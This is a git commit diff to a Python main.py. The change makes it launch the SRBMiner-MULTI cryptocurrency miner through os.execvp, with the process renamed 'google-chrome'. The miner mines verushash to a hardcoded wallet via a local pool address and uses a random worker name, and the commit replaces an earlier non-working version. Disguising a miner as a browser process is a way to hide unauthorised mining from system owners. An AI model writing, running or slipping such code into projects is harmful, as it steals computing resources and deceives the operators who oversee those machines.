74d847ada6f056066eb815fbb6349badf113c747
gahalusinta4 <gahalusinta@gmail.com>
2024-10-13 00:20:18 +0800

    Update main.py

--- main.py
+++ main.py
@@ -16,36 +16,13 @@ name = random.randint(2000,9000)
 #     "-t", "50"
 # ])
 
-# os.execvp("./SRBMiner-MULTI",  [
-#     "google-chrome",
-#     "--disable-gpu",
-#     "--algorithm", "verushash",
-#     "--pool", "localhost:3000",
-#     "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
-#     "--worker", f"aaa{name}", 
-#     "--password", "d=4",
-#     "--cpu-threads", "4"
-# ])
-import os
-
-# Example worker name
-name = "your_worker_name"
-
-# Arguments for SRBMiner-MULTI
-srb_args = [
-    "./SRBMiner-MULTI", 
-    "--disable-gpu", 
+os.execvp("./SRBMiner-MULTI",  [
+    "google-chrome",
+    "--disable-gpu",
     "--algorithm", "verushash",
-    "--pool", "localhost:3000", 
-    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK", 
+    "--pool", "127.0.0.1:3000",
+    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
     "--worker", f"aaa{name}", 
-    "--password", "d=4", 
+    "--password", "d=4",
     "--cpu-threads", "4"
-]
-
-# Replace the current process with google-chrome
-chrome_args = ["google-chrome"]
-
-# Executing google-chrome and passing the arguments from SRBMiner
-os.execvp(srb_args, chrome_args)
-
+])
